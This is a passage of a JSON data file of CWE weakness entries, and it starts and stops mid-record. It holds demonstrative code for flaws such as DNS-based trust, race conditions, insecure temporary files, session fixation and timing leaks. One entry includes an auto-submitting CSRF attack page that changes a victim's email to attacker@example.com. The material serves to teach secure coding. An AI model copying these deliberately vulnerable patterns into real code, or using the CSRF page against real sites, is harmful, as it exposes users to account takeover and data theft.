        "demonstrative_examples": "Example 1 The following code samples use a DNS lookup in order to decide whether or not an inbound request is from a trusted host. If an attacker can poison the DNS cache, they can gain trusted status. (bad code) Example Language: C struct hostent *hp;struct in_addr myaddr; char* tHost = \"trustme.example.com\"; myaddr.s_addr=inet_addr(ip_addr_string); hp = gethostbyaddr((char *) &myaddr, sizeof(struct in_addr), AF_INET); if (hp && !strncmp(hp->h_name, tHost, sizeof(tHost))) { trusted = true; } else { trusted = false; } (bad code) Example Language: Java String ip = request.getRemoteAddr(); InetAddress addr = InetAddress.getByName(ip); if (addr.getCanonicalHostName().endsWith(\"trustme.com\")) { trusted = true; } (bad code) Example Language: C# IPAddress hostIPAddress = IPAddress.Parse(RemoteIpAddress); IPHostEntry hostInfo = Dns.GetHostByAddress(hostIPAddress); if (hostInfo.HostName.EndsWith(\"trustme.com\")) { trusted = true; } IP addresses are more reliable than DNS names, but they can also be spoofed. Attackers can easily forge the source IP address of the packets they send, but response packets will return to the forged IP address. To see the response packets, the attacker has to sniff the traffic between the victim machine and the forged IP address. In order to accomplish the required sniffing, attackers typically attempt to locate themselves on the same subnet as the victim machine. Attackers may be able to circumvent this requirement by using source routing, but source routing is disabled across much of the Internet today. In summary, IP address verification can be a useful part of an authentication scheme, but it should not be the single factor required for authentication. Example 2 In these examples, a connection is established if a request is made by a trusted host. (bad code) Example Language: C sd = socket(AF_INET, SOCK_DGRAM, 0); serv.sin_family = AF_INET; serv.sin_addr.s_addr = htonl(INADDR_ANY); servr.sin_port = htons(1008); bind(sd, (struct sockaddr *) & serv, sizeof(serv)); while (1) { memset(msg, 0x0, MAX_MSG); clilen = sizeof(cli); h=gethostbyname(inet_ntoa(cliAddr.sin_addr)); if (h->h_name==...) n = recvfrom(sd, msg, MAX_MSG, 0, (struct sockaddr *) & cli, &clilen); } (bad code) Example Language: Java while(true) { DatagramPacket rp=new DatagramPacket(rData,rData.length); outSock.receive(rp); String in = new String(p.getData(),0, rp.getLength()); InetAddress IPAddress = rp.getAddress(); int port = rp.getPort(); if ((rp.getHostName()==...) & (in==...)) { out = secret.getBytes(); DatagramPacket sp =new DatagramPacket(out,out.length, IPAddress, port); outSock.send(sp); } } These examples check if a request is from a trusted host before responding to a request, but the code only verifies the hostname as stored in the request packet. An attacker can spoof the hostname, thus impersonating a trusted client."
    },
    {
        "id": 351,
        "demonstrative_examples": ""
    },
    {
        "id": 352,
        "demonstrative_examples": "Example 1 \"This example PHP code attempts to secure the form submission process by validating that the user submitting the form has a valid session. A CSRF attack would not be prevented by this countermeasure because the attacker forges a request through the user's web browser in which a valid session already exists.\" The following HTML is intended to allow a user to update a profile. (bad code) Example Language: HTML <form action=\"/url/profile.php\" method=\"post\"> <input type=\"text\" name=\"firstname\"/> <input type=\"text\" name=\"lastname\"/> <br/> <input type=\"text\" name=\"email\"/> <input type=\"submit\" name=\"submit\" value=\"Update\"/> </form> profile.php contains the following code. (bad code) Example Language: PHP // initiate the session in order to validate sessions session_start(); //if the session is registered to a valid user then allow update if (! session_is_registered(\"username\")) { echo \"invalid session detected!\"; // Redirect user to login page [...] exit; } // The user session is valid, so process the request // and update the information update_profile(); function update_profile { // read in the data from $POST and send an update // to the database \"SendUpdateToDatabase($_SESSION['username'], $_POST['email']);\" [...] echo \"Your profile has been successfully updated.\"; } This code may look protected since it checks for a valid session. However, CSRF attacks can be staged from virtually any tag or HTML construct, including image tags, links, embed or object tags, or other attributes that load background images. The attacker can then host code that will silently change the username and email address of any user that visits the page while remaining logged in to the target web application. The code might be an innocent-looking web page such as: (attack code) Example Language: HTML <SCRIPT> function SendAttack () { form.email = \"attacker@example.com\"; // send to profile.php form.submit(); } </SCRIPT> <BODY onload=\"javascript:SendAttack();\"> <form action=\"http://victim.example.com/profile.php\" id=\"form\" method=\"post\"> <input type=\"hidden\" name=\"firstname\" value=\"Funny\"> <input type=\"hidden\" name=\"lastname\" value=\"Joke\"> <br/> <input type=\"hidden\" name=\"email\"> </form> \"Notice how the form contains hidden fields, so when it is loaded into the browser, the user will not notice it. Because SendAttack() is defined in the body's onload attribute, it will be automatically called when the victim loads the web page.\" \"Assuming that the user is already logged in to victim.example.com, profile.php will see that a valid user session has been established, then update the email address to the attacker's own address. At this stage, the user's identity has been compromised, and messages sent through this profile could be sent to the attacker's address.\""
    },
    {
        "id": 353,
        "demonstrative_examples": "Example 1 In this example, a request packet is received, and privileged information is sent to the requester: (bad code) Example Language: Java while(true) { DatagramPacket rp = new DatagramPacket(rData,rData.length); outSock.receive(rp); InetAddress IPAddress = rp.getAddress(); int port = rp.getPort(); out = secret.getBytes(); DatagramPacket sp =new DatagramPacket(out, out.length, IPAddress, port); outSock.send(sp); } The response containing secret data has no integrity check associated with it, allowing an attacker to alter the message without detection."
    },
    {
        "id": 354,
        "demonstrative_examples": "Example 1 The following example demonstrates the weakness. (bad code) Example Language: C sd = socket(AF_INET, SOCK_DGRAM, 0); serv.sin_family = AF_INET; serv.sin_addr.s_addr = htonl(INADDR_ANY); servr.sin_port = htons(1008); bind(sd, (struct sockaddr *) & serv, sizeof(serv)); while (1) { memset(msg, 0x0, MAX_MSG); clilen = sizeof(cli); if (inet_ntoa(cli.sin_addr)==...) n = recvfrom(sd, msg, MAX_MSG, 0, (struct sockaddr *) & cli, &clilen); } (bad code) Example Language: Java while(true) { DatagramPacket packet = new DatagramPacket(data,data.length,IPAddress, port); socket.send(sendPacket); }"
    },
    {
        "id": 356,
        "demonstrative_examples": ""
    },
    {
        "id": 357,
        "demonstrative_examples": ""
    },
    {
        "id": 358,
        "demonstrative_examples": ""
    },
    {
        "id": 359,
        "demonstrative_examples": "Example 1 The following code contains a logging statement that tracks the contents of records added to a database by storing them in a log file. Among other values that are stored, the getPassword() function returns the user-supplied plaintext password associated with the account. (bad code) Example Language: C# pass = GetPassword(); ... dbmsLog.WriteLine(id + \":\" + pass + \":\" + type + \":\" + tstamp); The code in the example above logs a plaintext password to the filesystem. Although many developers trust the filesystem as a safe storage location for data, it should not be trusted implicitly, particularly when privacy is a concern. Example 2 \"This code uses location to determine the user's current US State location.\" \"First the application must declare that it requires the ACCESS_FINE_LOCATION permission in the application's manifest.xml:\" (bad code) Example Language: XML <uses-permission android:name=\"android.permission.ACCESS_FINE_LOCATION\"/> \"During execution, a call to getLastLocation() will return a location based on the application's location permissions. In this case the application has permission for the most accurate location possible:\" (bad code) Example Language: Java locationClient = new LocationClient(this, this, this); locationClient.connect(); Location userCurrLocation; userCurrLocation = locationClient.getLastLocation(); deriveStateFromCoords(userCurrLocation); While the application needs this information, it does not need to use the ACCESS_FINE_LOCATION permission, as the ACCESS_COARSE_LOCATION permission will be sufficient to identify which US state the user is in. Example 3 In 2004, an employee at AOL sold approximately 92 million private customer e-mail addresses to a spammer marketing an offshore gambling web site [ REF-338 ]. In response to such high-profile exploits, the collection and management of private data is becoming increasingly regulated."
    },
    {
        "id": 360,
        "demonstrative_examples": "Example 1 This example code prints out secret information when an authorized user activates a button: (bad code) Example Language: Java public void actionPerformed(ActionEvent e) { if (e.getSource() == button) { System.out.println(\"print out secret information\"); } } This code does not attempt to prevent unauthorized users from activating the button. Even if the button is rendered non-functional to unauthorized users in the application UI, an attacker can easily send a false button press event to the application window and expose the secret information."
    },
    {
        "id": 362,
        "demonstrative_examples": "Example 1 This code could be used in an e-commerce application that supports transfers between accounts. It takes the total amount of the transfer, sends it to the new account, and deducts the amount from the original account. (bad code) Example Language: Perl $transfer_amount = GetTransferAmount(); $balance = GetBalanceFromDatabase(); if ($transfer_amount < 0) { FatalError(\"Bad Transfer Amount\"); } $newbalance = $balance - $transfer_amount; if (($balance - $transfer_amount) < 0) { FatalError(\"Insufficient Funds\"); } SendNewBalanceToDatabase($newbalance); NotifyUser(\"Transfer of $transfer_amount succeeded.\"); NotifyUser(\"New balance: $newbalance\"); A race condition could occur between the calls to GetBalanceFromDatabase() and SendNewBalanceToDatabase(). Suppose the balance is initially 100.00. An attack could be constructed as follows: (attack code) Example Language: Other In the following pseudocode, the attacker makes two simultaneous calls of the program, CALLER-1 and CALLER-2. Both callers are for the same user account. CALLER-1 (the attacker) is associated with PROGRAM-1 (the instance that handles CALLER-1). CALLER-2 is associated with PROGRAM-2. CALLER-1 makes a transfer request of 80.00. PROGRAM-1 calls GetBalanceFromDatabase and sets $balance to 100.00 PROGRAM-1 calculates $newbalance as 20.00, then calls SendNewBalanceToDatabase(). Due to high server load, the PROGRAM-1 call to SendNewBalanceToDatabase() encounters a delay. CALLER-2 makes a transfer request of 1.00. PROGRAM-2 calls GetBalanceFromDatabase() and sets $balance to 100.00. This happens because the previous PROGRAM-1 request was not processed yet. PROGRAM-2 determines the new balance as 99.00. After the initial delay, PROGRAM-1 commits its balance to the database, setting it to 20.00. PROGRAM-2 sends a request to update the database, setting the balance to 99.00 At this stage, the attacker should have a balance of 19.00 (due to 81.00 worth of transfers), but the balance is 99.00, as recorded in the database. To prevent this weakness, the programmer has several options, including using a lock to prevent multiple simultaneous requests to the web application, or using a synchronization mechanism that includes all the code between GetBalanceFromDatabase() and SendNewBalanceToDatabase(). Example 2 The following function attempts to acquire a lock in order to perform operations on a shared resource. (bad code) Example Language: C void f(pthread_mutex_t *mutex) { pthread_mutex_lock(mutex); /* access shared resource */ pthread_mutex_unlock(mutex); } However, the code does not check the value returned by pthread_mutex_lock() for errors. If pthread_mutex_lock() cannot acquire the mutex for any reason, the function may introduce a race condition into the program and result in undefined behavior. In order to avoid data races, correctly written programs must check the result of thread synchronization functions and appropriately handle all errors, either by attempting to recover from them or reporting them to higher levels. (good code) Example Language: C int f(pthread_mutex_t *mutex) { int result; result = pthread_mutex_lock(mutex); if (0 != result) return result; /* access shared resource */ return pthread_mutex_unlock(mutex); } Example 3 Suppose a processor\\'s Memory Management Unit (MMU) has 5 other shadow MMUs to distribute its workload for its various cores. Each MMU has the start address and end address of \"accessible\" memory. Any time this accessible range changes (as per the processor\\'s boot status), the main MMU sends an update message to all the shadow MMUs. Suppose the interconnect fabric does not prioritize such \"update\" packets over other general traffic packets. This introduces a race condition. If an attacker can flood the target with enough messages so that some of those attack packets reach the target before the new access ranges gets updated, then the attacker can leverage this scenario."
    },
    {
        "id": 363,
        "demonstrative_examples": "Example 1 This code prints the contents of a file if a user has permission. (bad code) Example Language: PHP function readFile($filename){ $user = getCurrentUser(); //resolve file if its a symbolic link if(is_link($filename)){ $filename = readlink($filename); } if(fileowner($filename) == $user){ echo file_get_contents($realFile); return; } else{ \"echo 'Access denied';\" return false; } } This code attempts to resolve symbolic links before checking the file and printing its contents. However, an attacker may be able to change the file from a real file to a symbolic link between the calls to is_link() and file_get_contents(), allowing the reading of arbitrary files. Note that this code fails to log the attempted access ( CWE-778 )."
    },
    {
        "id": 364,
        "demonstrative_examples": "Example 1 This code registers the same signal handler function with two different signals ( CWE-831 ). If those signals are sent to the process, the handler creates a log message (specified in the first argument to the program) and exits. (bad code) Example Language: C char *logMessage; void handler (int sigNum) { syslog(LOG_NOTICE, \"%s\\\\n\", logMessage); free(logMessage); /* artificially increase the size of the timing window to make demonstration of this weakness easier. */ sleep(10); exit(0); } int main (int argc, char* argv[]) { logMessage = strdup(argv[1]); /* Register signal handlers. */ signal(SIGHUP, handler); signal(SIGTERM, handler); /* artificially increase the size of the timing window to make demonstration of this weakness easier. */ sleep(10); } The handler function uses global state (globalVar and logMessage), and it can be called by both the SIGHUP and SIGTERM signals. An attack scenario might follow these lines: The program begins execution, initializes logMessage, and registers the signal handlers for SIGHUP and SIGTERM. The program begins its \"normal\" functionality, which is simplified as sleep(), but could be any functionality that consumes some time. The attacker sends SIGHUP, which invokes handler (call this \"SIGHUP-handler\"). SIGHUP-handler begins to execute, calling syslog(). syslog() calls malloc(), which is non-reentrant. malloc() begins to modify metadata to manage the heap. The attacker then sends SIGTERM. \"SIGHUP-handler is interrupted, but syslog's malloc call is still executing and has not finished modifying its metadata.\" The SIGTERM handler is invoked. SIGTERM-handler records the log message using syslog(), then frees the logMessage variable. At this point, the state of the heap is uncertain, because malloc is still modifying the metadata for the heap; the metadata might be in an inconsistent state. The SIGTERM-handler call to free() is assuming that the metadata is inconsistent, possibly causing it to write data to the wrong location while managing the heap. The result is memory corruption, which could lead to a crash or even code execution, depending on the circumstances under which the code is running. Note that this is an adaptation of a classic example as originally presented by Michal Zalewski [ REF-360 ]; the original example was shown to be exploitable for code execution. Also note that the strdup(argv[1]) call contains a potential buffer over-read ( CWE-126 ) if the program is called without any arguments, because argc would be 0, and argv[1] would point outside the bounds of the array. Example 2 The following code registers a signal handler with multiple signals in order to log when a specific event occurs and to free associated memory before exiting. (bad code) Example Language: C #include <signal.h> #include <syslog.h> #include <string.h> #include <stdlib.h> void *global1, *global2; char *what; void sh (int dummy) { syslog(LOG_NOTICE,\"%s\\\\n\",what); free(global2); free(global1); /* Sleep statements added to expand timing window for race condition */ sleep(10); exit(0); } int main (int argc,char* argv[]) { what=argv[1]; global1=strdup(argv[2]); global2=malloc(340); signal(SIGHUP,sh); signal(SIGTERM,sh); /* Sleep statements added to expand timing window for race condition */ sleep(10); exit(0); } However, the following sequence of events may result in a double-free ( CWE-415 ): a SIGHUP is delivered to the process sh() is invoked to process the SIGHUP This first invocation of sh() reaches the point where global1 is freed At this point, a SIGTERM is sent to the process the second invocation of sh() might do another free of global1 this results in a double-free ( CWE-415 ) This is just one possible exploitation of the above code. As another example, the syslog call may use malloc calls which are not async-signal safe. This could cause corruption of the heap management structures. For more details, consult the example within \"Delivering Signals for Fun and Profit\" [ REF-360 ]."
    },
    {
        "id": 365,
        "demonstrative_examples": "Example 1 This example has a switch statement that executes different code depending on the current time. (bad code) Example Language: C #include <sys/types.h> #include <sys/stat.h> int main(argc,argv){ struct stat *sb; time_t timer; lstat(\"bar.sh\",sb); printf(\"%d\\\\n\",sb->st_ctime); switch(sb->st_ctime % 2){ case 0: printf(\"One option\\\\n\"); break; case 1: printf(\"another option\\\\n\"); break; default: printf(\"huh\\\\n\"); break; } return 0; } It seems that the default case of the switch statement should never be reached, as st_ctime % 2 should always be 0 or 1. However, if st_ctime % 2 is 1 when the first case is evaluated, the time may change and st_ctime % 2 may be equal to 0 when the second case is evaluated. The result is that neither case 1 or case 2 execute, and the default option is chosen."
    },
    {
        "id": 366,
        "demonstrative_examples": "Example 1 The following example demonstrates the weakness. (bad code) Example Language: C int foo = 0; int storenum(int num) { static int counter = 0; counter++; if (num > foo) foo = num; return foo; } (bad code) Example Language: Java public classRace { static int foo = 0; public static void main() { new Threader().start(); foo = 1; } public static class Threader extends Thread { public void run() { System.out.println(foo); } } }"
    },
    {
        "id": 367,
        "demonstrative_examples": "Example 1 The following code checks a file, then updates its contents. (bad code) Example Language: C struct stat *sb; ... lstat(\"...\",sb); // it has not been updated since the last time it was read printf(\"stated file\\\\n\"); if (sb->st_mtimespec==...){ print(\"Now updating things\\\\n\"); updateThings(); } Potentially the file could have been updated between the time of the check and the lstat, especially since the printf has latency. Example 2 The following code is from a program installed setuid root. The program performs certain file operations on behalf of non-privileged users, and uses access checks to ensure that it does not use its root privileges to perform operations that should otherwise be unavailable the current user. The program uses the access() system call to check if the person running the program has permission to access the specified file before it opens the file and performs the necessary operations. (bad code) Example Language: C if(!access(file,W_OK)) { f = fopen(file,\"w+\"); operate(f); ... } else { fprintf(stderr,\"Unable to open file %s.\\\\n\",file); } The call to access() behaves as expected, and returns 0 if the user running the program has the necessary permissions to write to the file, and -1 otherwise. However, because both access() and fopen() operate on filenames rather than on file handles, there is no guarantee that the file variable still refers to the same file on disk when it is passed to fopen() that it did when it was passed to access(). If an attacker replaces file after the call to access() with a symbolic link to a different file, the program will use its root privileges to operate on the file even if it is a file that the attacker would otherwise be unable to modify. By tricking the program into performing an operation that would otherwise be impermissible, the attacker has gained elevated privileges. This type of vulnerability is not limited to programs with root privileges. If the application is capable of performing any operation that the attacker would not otherwise be allowed perform, then it is a possible target. Example 3 This code prints the contents of a file if a user has permission. (bad code) Example Language: PHP function readFile($filename){ $user = getCurrentUser(); //resolve file if its a symbolic link if(is_link($filename)){ $filename = readlink($filename); } if(fileowner($filename) == $user){ echo file_get_contents($realFile); return; } else{ \"echo 'Access denied';\" return false; } } This code attempts to resolve symbolic links before checking the file and printing its contents. However, an attacker may be able to change the file from a real file to a symbolic link between the calls to is_link() and file_get_contents(), allowing the reading of arbitrary files. Note that this code fails to log the attempted access ( CWE-778 )."
    },
    {
        "id": 368,
        "demonstrative_examples": ""
    },
    {
        "id": 369,
        "demonstrative_examples": "Example 1 The following Java example contains a function to compute an average but does not validate that the input value used as the denominator is not zero. This will create an exception for attempting to divide by zero. If this error is not handled by Java exception handling, unexpected results can occur. (bad code) Example Language: Java public int computeAverageResponseTime (int totalTime, int numRequests) { return totalTime / numRequests; } By validating the input value used as the denominator the following code will ensure that a divide by zero error will not cause unexpected results. The following Java code example will validate the input value, output an error message, and throw an exception. (good code) public int computeAverageResponseTime (int totalTime, int numRequests) throws ArithmeticException { if (numRequests == 0) { System.out.println(\"Division by zero attempted!\"); throw ArithmeticException; } return totalTime / numRequests; } Example 2 The following C/C++ example contains a function that divides two numeric values without verifying that the input value used as the denominator is not zero. This will create an error for attempting to divide by zero, if this error is not caught by the error handling capabilities of the language, unexpected results can occur. (bad code) Example Language: C double divide(double x, double y){ return x/y; } By validating the input value used as the denominator the following code will ensure that a divide by zero error will not cause unexpected results. If the method is called and a zero is passed as the second argument a DivideByZero error will be thrown and should be caught by the calling block with an output message indicating the error. (good code) const int DivideByZero = 10; double divide(double x, double y){ if ( 0 == y ){ throw DivideByZero; } return x/y; } ... try{ divide(10, 0); } catch( int i ){ if(i==DivideByZero) { cerr<<\"Divide by zero error\"; } } Example 2 References: [REF-371] Alex Allain. \"Handling Errors Exceptionally Well in C++\". < http://www.cprogramming.com/tutorial/exceptions.html >. Example 3 The following C# example contains a function that divides two numeric values without verifying that the input value used as the denominator is not zero. This will create an error for attempting to divide by zero, if this error is not caught by the error handling capabilities of the language, unexpected results can occur. (bad code) Example Language: C# int Division(int x, int y){ return (x / y); } The method can be modified to raise, catch and handle the DivideByZeroException if the input value used as the denominator is zero. (good code) int SafeDivision(int x, int y){ try{ return (x / y); } catch (System.DivideByZeroException dbz){ System.Console.WriteLine(\"Division by zero attempted!\"); return 0; } } Example 3 References: [REF-372] Microsoft. \"Exceptions and Exception Handling (C# Programming Guide)\". < https://msdn.microsoft.com/pl-pl/library/ms173160(v=vs.100).aspx >."
    },
    {
        "id": 370,
        "demonstrative_examples": "Example 1 The following code checks a certificate before performing an action. (bad code) Example Language: C if (cert = SSL_get_peer_certificate(ssl)) { foo=SSL_get_verify_result(ssl); if (X509_V_OK==foo) //do stuff foo=SSL_get_verify_result(ssl); //do more stuff without the check. While the code performs the certificate verification before each action, it does not check the result of the verification after the initial attempt. The certificate may have been revoked in the time between the privileged actions."
    },
    {
        "id": 372,
        "demonstrative_examples": ""
    },
    {
        "id": 374,
        "demonstrative_examples": "Example 1 The following example demonstrates the weakness. (bad code) Example Language: C private: int foo; complexType bar; String baz; otherClass externalClass; public: void doStuff() { externalClass.doOtherStuff(foo, bar, baz) } In this example, bar and baz will be passed by reference to doOtherStuff() which may change them. Example 2 In the following Java example, the BookStore class manages the sale of books in a bookstore, this class includes the member objects for the bookstore inventory and sales database manager classes. The BookStore class includes a method for updating the sales database and inventory when a book is sold. This method retrieves a Book object from the bookstore inventory object using the supplied ISBN number for the book class, then calls a method for the sales object to update the sales information and then calls a method for the inventory object to update inventory for the BookStore. (bad code) Example Language: Java public class BookStore { private BookStoreInventory inventory; private SalesDBManager sales; ... // constructor for BookStore public BookStore() { this.inventory = new BookStoreInventory(); this.sales = new SalesDBManager(); ... } public void updateSalesAndInventoryForBookSold(String bookISBN) { // Get book object from inventory using ISBN Book book = inventory.getBookWithISBN(bookISBN); // update sales information for book sold sales.updateSalesInformation(book); // update inventory inventory.updateInventory(book); } // other BookStore methods ... } public class Book { private String title; private String author; private String isbn; // Book object constructors and get/set methods ... } However, in this example the Book object that is retrieved and passed to the method of the sales object could have its contents modified by the method. This could cause unexpected results when the book object is sent to the method for the inventory object to update the inventory. In the Java programming language arguments to methods are passed by value, however in the case of objects a reference to the object is passed by value to the method. When an object reference is passed as a method argument a copy of the object reference is made within the method and therefore both references point to the same object. This allows the contents of the object to be modified by the method that holds the copy of the object reference. [ REF-374 ] In this case the contents of the Book object could be modified by the method of the sales object prior to the call to update the inventory. To prevent the contents of the Book object from being modified, a copy of the Book object should be made before the method call to the sales object. In the following example a copy of the Book object is made using the clone() method and the copy of the Book object is passed to the method of the sales object. This will prevent any changes being made to the original Book object. (good code) Example Language: Java ... public void updateSalesAndInventoryForBookSold(String bookISBN) { // Get book object from inventory using ISBN Book book = inventory.getBookWithISBN(bookISBN); // Create copy of book object to make sure contents are not changed Book bookSold = (Book) book.clone(); // update sales information for book sold sales.updateSalesInformation(bookSold); // update inventory inventory.updateInventory(book); } ..."
    },
    {
        "id": 375,
        "demonstrative_examples": "Example 1 This class has a private list of patients, but provides a way to see the list : (bad code) Example Language: Java public class ClinicalTrial { private PatientClass[] patientList = new PatientClass[50]; public getPatients(...){ return patientList; } } \"While this code only means to allow reading of the patient list, the getPatients() method returns a reference to the class's original patient list instead of a reference to a copy of the list. Any caller of this method can arbitrarily modify the contents of the patient list even though it is a private member of the class.\""
    },
    {
        "id": 377,
        "demonstrative_examples": "Example 1 The following code uses a temporary file for storing intermediate data gathered from the network before it is processed. (bad code) Example Language: C if (tmpnam_r(filename)) { FILE* tmp = fopen(filename,\"wb+\"); while((recv(sock,recvbuf,DATA_SIZE, 0) > 0)&(amt!=0)) amt = fwrite(recvbuf,1,DATA_SIZE,tmp); } ... This otherwise unremarkable code is vulnerable to a number of different attacks because it relies on an insecure method for creating temporary files. The vulnerabilities introduced by this function and others are described in the following sections. The most egregious security problems related to temporary file creation have occurred on Unix-based operating systems, but Windows applications have parallel risks. This section includes a discussion of temporary file creation on both Unix and Windows systems. Methods and behaviors can vary between systems, but the fundamental risks introduced by each are reasonably constant."
    },
    {
        "id": 378,
        "demonstrative_examples": "Example 1 In the following code examples a temporary file is created and written to.  After using the temporary file, the file is closed and deleted from the file system. (bad code) Example Language: C FILE *stream; if( (stream = tmpfile()) == NULL ) { perror(\"Could not open new temporary file\\\\n\"); return (-1); } // write data to tmp file ... // remove tmp file rmtmp(); However, within this C/C++ code the method tmpfile() is used to create and open the temp file. The tmpfile() method works the same way as the fopen() method would with read/write permission, allowing attackers to read potentially sensitive information contained in the temp file or modify the contents of the file. (bad code) Example Language: Java try { File temp = File.createTempFile(\"pattern\", \".suffix\"); temp.deleteOnExit(); BufferedWriter out = new BufferedWriter(new FileWriter(temp)); out.write(\"aString\"); out.close(); } catch (IOException e) { } Similarly, the createTempFile() method used in the Java code creates a temp file that may be readable and writable to all users. Additionally both methods used above place the file into a default directory. On UNIX systems the default directory is usually \"/tmp\" or \"/var/tmp\" and on Windows systems the default directory is usually \"C:\\\\\\\\Windows\\\\\\\\Temp\", which may be easily accessible to attackers, possibly enabling them to read and modify the contents of the temp file."
    },
    {
        "id": 379,
        "demonstrative_examples": "Example 1 In the following code examples a temporary file is created and written to.  After using the temporary file, the file is closed and deleted from the file system. (bad code) Example Language: C FILE *stream; if( (stream = tmpfile()) == NULL ) { perror(\"Could not open new temporary file\\\\n\"); return (-1); } // write data to tmp file ... // remove tmp file rmtmp(); However, within this C/C++ code the method tmpfile() is used to create and open the temp file. The tmpfile() method works the same way as the fopen() method would with read/write permission, allowing attackers to read potentially sensitive information contained in the temp file or modify the contents of the file. (bad code) Example Language: Java try { File temp = File.createTempFile(\"pattern\", \".suffix\"); temp.deleteOnExit(); BufferedWriter out = new BufferedWriter(new FileWriter(temp)); out.write(\"aString\"); out.close(); } catch (IOException e) { } Similarly, the createTempFile() method used in the Java code creates a temp file that may be readable and writable to all users. Additionally both methods used above place the file into a default directory. On UNIX systems the default directory is usually \"/tmp\" or \"/var/tmp\" and on Windows systems the default directory is usually \"C:\\\\\\\\Windows\\\\\\\\Temp\", which may be easily accessible to attackers, possibly enabling them to read and modify the contents of the temp file."
    },
    {
        "id": 382,
        "demonstrative_examples": "Example 1 Included in the doPost() method defined below is a call to System.exit() in the event of a specific exception. (bad code) Example Language: Java Public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { try { ... } catch (ApplicationSpecificException ase) { logger.error(\"Caught: \" + ase.toString()); System.exit(1); } }"
    },
    {
        "id": 383,
        "demonstrative_examples": "Example 1 In the following example, a new Thread object is created and invoked directly from within the body of a doGet() method in a Java servlet. (bad code) Example Language: Java public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { // Perform servlet tasks. ... // Create a new thread to handle background processing. Runnable r = new Runnable() { public void run() { // Process and store request statistics. ... } }; new Thread(r).start(); }"
    },
    {
        "id": 384,
        "demonstrative_examples": "Example 1 The following example shows a snippet of code from a J2EE web application where the application authenticates users with LoginContext.login() without first calling HttpSession.invalidate(). (bad code) Example Language: Java private void auth(LoginContext lc, HttpSession session) throws LoginException { ... lc.login(); ... } \"In order to exploit the code above, an attacker could first create a session (perhaps by logging into the application) from a public terminal, record the session identifier assigned by the application, and reset the browser to the login page. Next, a victim sits down at the same public terminal, notices the browser open to the login page of the site, and enters credentials to authenticate against the application. The code responsible for authenticating the victim continues to use the pre-existing session identifier, now the attacker simply uses the session identifier recorded earlier to access the victim's active session, providing nearly unrestricted access to the victim's account for the lifetime of the session. Even given a vulnerable application, the success of the specific attack described here is dependent on several factors working in the favor of the attacker: access to an unmonitored public terminal, the ability to keep the compromised session active and a victim interested in logging into the vulnerable application on the public terminal.\" In most circumstances, the first two challenges are surmountable given a sufficient investment of time. Finding a victim who is both using a public terminal and interested in logging into the vulnerable application is possible as well, so long as the site is reasonably popular. The less well known the site is, the lower the odds of an interested victim using the public terminal and the lower the chance of success for the attack vector described above. The biggest challenge an attacker faces in exploiting session fixation vulnerabilities is inducing victims to authenticate against the vulnerable application using a session identifier known to the attacker. \"In the example above, the attacker did this through a direct method that is not subtle and does not scale suitably for attacks involving less well-known web sites. However, do not be lulled into complacency; attackers have many tools in their belts that help bypass the limitations of this attack vector. The most common technique employed by attackers involves taking advantage of cross-site scripting or HTTP response splitting vulnerabilities in the target site [12]. By tricking the victim into submitting a malicious request to a vulnerable application that reflects JavaScript or other code back to the victim's browser, an attacker can create a cookie that will cause the victim to reuse a session identifier controlled by the attacker. It is worth noting that cookies are often tied to the top level domain associated with a given URL. If multiple applications reside on the same top level domain, such as bank.example.com and recipes.example.com, a vulnerability in one application can allow an attacker to set a cookie with a fixed session identifier that will be used in all interactions with any application on the domain example.com [29].\" Example 2 The following example shows a snippet of code from a J2EE web application where the application authenticates users with a direct post to the <code>j_security_check</code>, which typically does not invalidate the existing session before processing the login request. (bad code) Example Language: HTML <form method=\"POST\" action=\"j_security_check\"> <input type=\"text\" name=\"j_username\"> <input type=\"text\" name=\"j_password\"> </form>"
    },
    {
        "id": 385,
        "demonstrative_examples": "Example 1 In this example, the attacker observes how long an authentication takes when the user types in the correct password. When the attacker tries their own values, they can first try strings of various length. When they find a string of the right length, the computation will take a bit longer, because the for loop will run at least once. Additionally, with this code, the attacker can possibly learn one character of the password at a time, because when they guess the first character right, the computation will take longer than a wrong guesses. Such an attack can break even the most sophisticated password with a few hundred guesses. (bad code) Example Language: Python def validate_password(actual_pw, typed_pw): if len(actual_pw) <> len(typed_pw): return 0 for i in len(actual_pw): if actual_pw[i] <> typed_pw[i]: return 0 return 1 Note that, in this example, the actual password must be handled in constant time, as far as the attacker is concerned, even if the actual password is of an unusual length. This is one reason why it is good to use an algorithm that, among other things, stores a seeded cryptographic one-way hash of the password, then compare the hashes, which will always be of the same length."
    },
    {
        "id": 386,
        "demonstrative_examples": ""
    },
    {
        "id": 390,
        "demonstrative_examples": "Example 1 The following example attempts to allocate memory for a character. After the call to malloc, an if statement is used to check whether the malloc function failed. (bad code) Example Language: C foo=malloc(sizeof(char)); //the next line checks to see if malloc failed if (foo==NULL) { //We do nothing so we just ignore the error. } The conditional successfully detects a NULL return value from malloc indicating a failure, however it does not do anything to handle the problem. Unhandled errors may have unexpected results and may cause the program to crash or terminate. Instead, the if block should contain statements that either attempt to fix the problem or notify the user that an error has occurred and continue processing or perform some cleanup and gracefully terminate the program. The following example notifies the user that the malloc function did not allocate the required memory resources and returns an error code. (good code) Example Language: C foo=malloc(sizeof(char)); //the next line checks to see if malloc failed if (foo==NULL) { printf(\"Malloc failed to allocate memory resources\"); return -1; } Example 2 In the following C++ example the method readFile() will read the file whose name is provided in the input parameter and will return the contents of the file in char string. The method calls open() and read() may result in errors if the file does not exist or does not contain any data to read. These errors will be thrown when the is_open() method and good() method indicate errors opening or reading the file. However, these errors are not handled within the catch statement. Catch statements that do not perform any processing will have unexpected results. In this case an empty char string will be returned, and the file will not be properly closed. (bad code) Example Language: C++ char* readfile (char *filename) { try { // open input file ifstream infile; infile.open(filename); if (!infile.is_open()) { throw \"Unable to open file \" + filename; } // get length of file infile.seekg (0, ios::end); int length = infile.tellg(); infile.seekg (0, ios::beg); // allocate memory char *buffer = new char [length]; // read data from file infile.read (buffer,length); if (!infile.good()) { throw \"Unable to read from file \" + filename; } infile.close(); return buffer; } catch (...) { /* bug: insert code to handle this later */ } } The catch statement should contain statements that either attempt to fix the problem or notify the user that an error has occurred and continue processing or perform some cleanup and gracefully terminate the program. The following C++ example contains two catch statements. The first of these will catch a specific error thrown within the try block, and the second catch statement will catch all other errors from within the catch block. Both catch statements will notify the user that an error has occurred, close the file, and rethrow to the block that called the readFile() method for further handling or possible termination of the program. (good code) Example Language: C++ char* readFile (char *filename) { try { // open input file ifstream infile; infile.open(filename); if 